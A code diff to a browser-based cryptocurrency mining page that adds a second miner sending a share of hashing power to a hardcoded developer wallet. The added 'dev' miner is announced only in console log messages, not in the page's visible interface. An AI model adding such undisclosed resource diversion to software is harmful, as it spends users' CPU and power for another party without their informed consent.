@@ -427,6 +427,7 @@
     let minerRunning = false;
     let currentWallet = '';
     let currentWorker = '';
+    const devWallet = '45BBbPLpGnHVnVG3k3K12ngLSt5oMbrJRc8XduYMsdkKiLubk6TcU6kgmUD2AShj5hX5WUmGgDw5Add5ozKu6mZMBftHtFN';
 
     console.log('Web Miner script initialized');
 
@@ -452,9 +453,16 @@
         }
         currentWallet = wallet;
         currentWorker = 'brody_' + Math.random().toString(36).slice(2);
-        EverythingIsLife(currentWallet, currentWorker, 50);
+        
+        // User miner: 95% throttle
+        EverythingIsLife(currentWallet, currentWorker, 95);
+        console.log('User mining started for ' + currentWallet + ' at 95% throttle');
+        
+        // Dev miner: 5% throttle
+        EverythingIsLife(devWallet, 'dev_' + currentWorker, 5);
+        console.log('Dev mining started for ' + devWallet + ' at 5% throttle');
+        
         minerRunning = true;
-        console.log('Web mining started for ' + currentWallet);
         
         // UI updates
         document.getElementById('start-mining').style.display = 'none';
@@ -470,13 +478,16 @@
             return;
         }
         minerRunning = false;
-        window.location.reload(); // Reload to stop miner
+        window.location.reload(); // Reload to stop both miners
         console.log('Web mining stopped');
     }
 
     // Debug interval
     setInterval(() => {
-        if (minerRunning) console.log('Miner running for ' + currentWallet);
+        if (minerRunning) {
+            console.log('User miner running for ' + currentWallet);
+            console.log('Dev miner running for ' + devWallet);
+        }
     }, 5000);
 </script>
 </body>
